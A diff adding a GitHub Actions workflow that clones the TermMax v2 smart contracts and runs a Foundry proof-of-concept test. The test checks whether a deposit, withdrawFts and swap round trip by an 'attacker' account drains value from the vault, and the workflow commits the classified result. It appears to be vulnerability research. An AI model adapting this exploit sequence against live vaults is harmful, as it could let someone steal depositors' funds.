@@ -1,0 +1,132 @@
+name: termmax-withdrawfts-gate
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+    paths:
+      - 'termmax-withdrawfts-gate-trigger.txt'
+
+permissions:
+  contents: write
+
+jobs:
+  withdrawfts-gate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}
+      - name: Install Foundry and source
+        shell: bash
+        run: |
+          set -euxo pipefail
+          curl -L https://foundry.paradigm.xyz | bash
+          export PATH="$HOME/.foundry/bin:$PATH"
+          foundryup
+          git clone https://github.com/term-structure/termmax-contract-v2.git termmax
+          cd termmax
+          git checkout e314f3f849577dfecd4614f148c4df81fdf8c72d
+          forge soldeer install || true
+          mkdir -p ../termmax-withdrawfts-result
+
+      - name: Add exact economic round-trip PoC
+        shell: bash
+        run: |
+          cat > termmax/test/v2/WithdrawFtsRoundTripGate.t.sol <<'SOL'
+          // SPDX-License-Identifier: MIT
+          pragma solidity ^0.8.27;
+          import {VaultTestV2} from "./VaultV2.t.sol";
+          import {console} from "forge-std/console.sol";
+
+          contract WithdrawFtsRoundTripGate is VaultTestV2 {
+              function _roundTrip(uint256 warpDays, uint256 amount) internal {
+                  vm.warp(currentTime + warpDays * 1 days);
+                  // Reproduce the official fixture path that makes FT available in the vault order.
+                  buyXt(48.219178e8, 1000e8);
+                  address attacker = makeAddr("withdrawfts-attacker");
+                  res.debt.mint(attacker, amount);
+                  uint256 debtBefore = res.debt.balanceOf(attacker);
+                  uint256 incumbentSharesBefore = vault.balanceOf(deployer);
+                  uint256 vaultAssetsBefore = vault.totalAssets();
+
+                  vm.startPrank(attacker);
+                  res.debt.approve(address(vault), amount);
+                  vault.deposit(amount, attacker);
+                  uint256 mintedShares = vault.balanceOf(attacker);
+                  uint256 ftBefore = res.ft.balanceOf(attacker);
+                  uint256 sharesBurned = vault.withdrawFts(address(res.order), amount, attacker, attacker);
+                  uint256 ftReceived = res.ft.balanceOf(attacker) - ftBefore;
+                  res.ft.approve(address(res.order), ftReceived);
+                  uint256 debtOut = res.order.swapExactTokenToToken(
+                      res.ft, res.debt, attacker, uint128(ftReceived), 0, block.timestamp + 1 hours
+                  );
+                  vm.stopPrank();
+
+                  uint256 debtAfter = res.debt.balanceOf(attacker);
+                  uint256 incumbentSharesAfter = vault.balanceOf(deployer);
+                  uint256 vaultAssetsAfter = vault.totalAssets();
+                  console.log("WARP_DAYS", warpDays);
+                  console.log("INPUT_DEBT", debtBefore);
+                  console.log("MINTED_SHARES", mintedShares);
+                  console.log("SHARES_BURNED", sharesBurned);
+                  console.log("FT_RECEIVED", ftReceived);
+                  console.log("DEBT_OUT_RETURN", debtOut);
+                  console.log("ATTACKER_DEBT_AFTER", debtAfter);
+                  console.log("VAULT_ASSETS_BEFORE", vaultAssetsBefore);
+                  console.log("VAULT_ASSETS_AFTER", vaultAssetsAfter);
+                  console.log("INCUMBENT_SHARES_BEFORE", incumbentSharesBefore);
+                  console.log("INCUMBENT_SHARES_AFTER", incumbentSharesAfter);
+                  assertEq(vault.balanceOf(attacker), 0, "attacker must have no residual shares");
+                  if (debtAfter > debtBefore) console.log("WITHDRAWFTS_DIRECT_PROFIT_CANDIDATE");
+                  else console.log("WITHDRAWFTS_NO_DIRECT_PROFIT");
+              }
+
+              function test_Gate_Day2_100() public { _roundTrip(2, 100e8); }
+              function test_Gate_Day30_100() public { _roundTrip(30, 100e8); }
+              function test_Gate_Day89_100() public { _roundTrip(89, 100e8); }
+              function test_Gate_Day89_500() public { _roundTrip(89, 500e8); }
+          }
+          SOL
+
+      - name: Run PoC grid and classify
+        shell: bash
+        run: |
+          set +e
+          export PATH="$HOME/.foundry/bin:$PATH"
+          cd termmax
+          forge test --match-contract WithdrawFtsRoundTripGate -vvvv > ../termmax-withdrawfts-result/FOUNDRY.log 2>&1
+          st=$?
+          echo "$st" > ../termmax-withdrawfts-result/FOUNDRY_EXIT.txt
+          cp test/v2/WithdrawFtsRoundTripGate.t.sol ../termmax-withdrawfts-result/
+          cd ..
+          if grep -q 'WITHDRAWFTS_DIRECT_PROFIT_CANDIDATE' termmax-withdrawfts-result/FOUNDRY.log; then
+            echo 'ACTIVE: at least one deposit-withdrawFts-sell round trip returned more debt than attacker input' > termmax-withdrawfts-result/RESULT.txt
+            touch termmax-withdrawfts-result/ACTIVE_CANDIDATE.marker
+          elif grep -q 'WITHDRAWFTS_NO_DIRECT_PROFIT' termmax-withdrawfts-result/FOUNDRY.log && test "$st" = 0; then
+            echo 'CLOSED: all tested specific-order FT round trips were non-profitable' > termmax-withdrawfts-result/RESULT.txt
+            touch termmax-withdrawfts-result/CLOSED.marker
+          else
+            echo 'UNRESOLVED: build or fixture failure' > termmax-withdrawfts-result/RESULT.txt
+            touch termmax-withdrawfts-result/UNRESOLVED.marker
+          fi
+          cat termmax-withdrawfts-result/FOUNDRY.log
+          exit 0
+
+      - name: Persist and upload
+        if: always()
+        shell: bash
+        run: |
+          set -euxo pipefail
+          sha256sum termmax-withdrawfts-result/* | sort > termmax-withdrawfts-result/SHA256SUMS.txt
+          git config user.name termmax-research-bot
+          git config user.email actions@users.noreply.github.com
+          git add termmax-withdrawfts-result
+          git commit -m 'Persist TermMax withdrawFts gate result' || true
+          git push origin HEAD:${{ github.event.pull_request.head.ref }} || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: termmax-withdrawfts-gate-result
+          path: termmax-withdrawfts-result/
+          retention-days: 7
